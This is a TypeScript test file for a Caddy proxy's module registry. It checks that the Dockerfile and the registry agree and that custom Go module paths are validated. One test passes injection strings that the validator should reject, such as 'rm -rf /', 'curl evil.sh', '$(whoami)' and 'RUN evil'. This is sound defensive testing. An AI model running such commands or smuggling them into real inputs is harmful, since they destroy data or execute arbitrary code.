/**
 * The Caddy module registry and custom-module validation.
 *
 * The registry is the contract between three things that cannot check each
 * other at runtime: the Dockerfile that compiles the binary, the config builder
 * that decides which handlers may appear, and the UI that decides which
 * settings are live. Most of what follows guards that agreement — a module in
 * the Dockerfile but not the registry is a plugin nobody can turn off, and one
 * in the registry but not the Dockerfile is a toggle that promises a plugin the
 * default image does not have.
 */
import { describe, it, expect } from 'bun:test';
import { readFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  CADDY_MODULES,
  DEFAULT_ENABLED_MODULE_IDS,
  customModuleSpec,
  dnsModuleId,
  findCaddyModule,
  modulesForFeature,
  normalizeModulePath,
  validateCustomModule,
} from '@/src/lib/caddy-modules';
import { DNS_PROVIDERS } from '@/src/lib/dns-providers';

const moduleDir = dirname(fileURLToPath(import.meta.url));
const DOCKERFILE = readFileSync(resolve(moduleDir, '../../docker/caddy/Dockerfile'), 'utf-8');

/** The whitespace-separated module list from the Dockerfile's ARG default. */
function dockerfileDefaultModules(): string[] {
  const match = DOCKERFILE.match(/ARG CADDY_MODULES="([\s\S]*?)"/);
  expect(match, 'Dockerfile must declare a CADDY_MODULES ARG with a default').toBeTruthy();
  return match![1]
    .split(/[\s\\]+/)
    .map((s) => s.trim())
    .filter(Boolean);
}

describe('caddy module registry', () => {
  it('has a unique id and module path per entry', () => {
    const ids = CADDY_MODULES.map((m) => m.id);
    const paths = CADDY_MODULES.map((m) => m.modulePath);
    expect(new Set(ids).size).toBe(ids.length);
    expect(new Set(paths).size).toBe(paths.length);
  });

  it('covers every DNS provider exactly once', () => {
    // A provider with no module would offer credentials for a plugin that is
    // never compiled in, and the DNS-01 challenge would fail at issuance time
    // with nothing in the UI to explain it.
    for (const provider of DNS_PROVIDERS) {
      const module = findCaddyModule(dnsModuleId(provider.name));
      expect(module, `no module registered for DNS provider ${provider.name}`).toBeDefined();
      expect(module!.modulePath).toBe(provider.modulePath);
      expect(module!.dnsProvider).toBe(provider.name);
    }
  });

  it('matches the Dockerfile default module list exactly', () => {
    expect(dockerfileDefaultModules().sort()).toEqual(
      CADDY_MODULES.map((m) => m.modulePath).sort(),
    );
  });

  it('records the resolved module list inside the image', () => {
    // The label this replaced came out empty on every build that did not pass
    // --build-arg, because ARG is scoped per stage and the runtime stage had no
    // default. Writing the file from the same variable the build loops over is
    // what keeps the record and the binary from disagreeing.
    expect(DOCKERFILE).toContain('> /caddy-modules.txt');
    // Shell interpolation of the build arg, not a JS template placeholder.
    expect(DOCKERFILE).toContain(['"$', '{CADDY_MODULES}"'].join(''));
    expect(DOCKERFILE).toContain(
      'COPY --from=builder /caddy-modules.txt /etc/caddy/caddy-modules.txt',
    );
  });

  it('declares the module ARG only in the stage that consumes it', () => {
    // A second declaration in the runtime stage would need its own copy of the
    // default list, and the two would drift the next time a module is added.
    const declarations = DOCKERFILE.split('\n').filter((l) => l.startsWith('ARG CADDY_MODULES'));
    expect(declarations).toHaveLength(1);
  });

  it('defaults to every module enabled', () => {
    // An upgrade must not silently drop a plugin someone's hosts depend on.
    expect(DEFAULT_ENABLED_MODULE_IDS.sort()).toEqual(CADDY_MODULES.map((m) => m.id).sort());
  });

  it('maps each gated feature to at least one module', () => {
    for (const feature of ['l4', 'geoblock', 'waf', 'dns01'] as const) {
      expect(modulesForFeature(feature).length, `no module powers "${feature}"`).toBeGreaterThan(0);
    }
  });

  it('names the plugin that powers each core feature', () => {
    expect(modulesForFeature('l4').map((m) => m.modulePath)).toEqual(['github.com/mholt/caddy-l4']);
    expect(modulesForFeature('geoblock').map((m) => m.modulePath)).toEqual([
      'github.com/fuomag9/caddy-blocker-plugin',
    ]);
    expect(modulesForFeature('waf').map((m) => m.modulePath)).toEqual([
      'github.com/corazawaf/coraza-caddy/v2',
    ]);
  });
});

describe('normalizeModulePath', () => {
  it('strips a pasted scheme and trailing slash', () => {
    // Module paths get copied out of a browser address bar more often than out
    // of a go.mod file.
    expect(normalizeModulePath('https://github.com/owner/repo/')).toBe('github.com/owner/repo');
    expect(normalizeModulePath('  github.com/owner/repo  ')).toBe('github.com/owner/repo');
  });
});

describe('validateCustomModule', () => {
  const ok = (modulePath: string, version?: string) =>
    validateCustomModule({ modulePath, version, enabled: true });

  it('accepts an ordinary Go module path', () => {
    expect(ok('github.com/greenpau/caddy-security')).toBeNull();
    expect(ok('github.com/corazawaf/coraza-caddy/v2')).toBeNull();
    expect(ok('git.example.com/team/caddy-thing', 'v1.2.3')).toBeNull();
  });

  it('requires a host and a path', () => {
    expect(ok('caddy-security')).toMatch(/host and a path/);
  });

  it('rejects an empty path', () => {
    expect(ok('   ')).toMatch(/required/);
  });

  it.each([
    ['github.com/owner/repo; rm -rf /'],
    ['github.com/owner/repo && curl evil.sh'],
    ['github.com/owner/$(whoami)'],
    ['github.com/owner/repo`id`'],
    ['github.com/owner/repo|tee'],
    ['github.com/owner/repo\nRUN evil'],
  ])('rejects shell metacharacters in %s', (path) => {
    // These land verbatim in a shell loop inside the Dockerfile, where word
    // splitting is what separates one module from the next. The allowlist is
    // the only thing between a pasted path and arbitrary build-time execution.
    expect(ok(path)).toMatch(/Invalid module path/);
  });

  it('rejects a version containing shell metacharacters', () => {
    expect(ok('github.com/owner/repo', 'v1;id')).toMatch(/Invalid version/);
  });

  it('rejects an implausibly long path', () => {
    expect(ok(`github.com/owner/${'a'.repeat(300)}`)).toMatch(/too long/);
  });
});

describe('customModuleSpec', () => {
  it('appends the version when one is given', () => {
    expect(
      customModuleSpec({ modulePath: 'github.com/o/r', version: 'v1.2.3', enabled: true }),
    ).toBe('github.com/o/r@v1.2.3');
  });

  it('omits the @ when the version is blank', () => {
    expect(customModuleSpec({ modulePath: 'github.com/o/r', version: '  ', enabled: true })).toBe(
      'github.com/o/r',
    );
  });

  it('normalizes the path it emits', () => {
    expect(customModuleSpec({ modulePath: 'https://github.com/o/r/', enabled: true })).toBe(
      'github.com/o/r',
    );
  });
});
